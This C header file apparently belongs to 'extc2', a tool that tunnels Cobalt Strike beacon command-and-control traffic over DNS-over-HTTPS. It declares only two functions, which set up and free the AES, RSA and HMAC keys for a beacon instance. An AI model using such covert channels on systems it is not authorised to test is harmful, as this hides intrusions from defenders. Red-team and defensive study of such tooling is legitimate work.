/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#pragma once

/*-
 *
 * CryptInit
 *
 * Purpose:
 *
 * Init's the key / provider objects
 * for AES, RSA and HMAC-SHA-256
 *
-*/
DEFINESEC(B) BOOL CryptInit( PBEACON_INSTANCE Ins );

/*-
 *
 * CryptFree
 *
 * Purpose:
 *
 * Free's the key / provider objects
 * for AES, RSA, and HMAC-SHA-256
 *
-*/
DEFINESEC(B) VOID CryptFree( PBEACON_INSTANCE Ins );
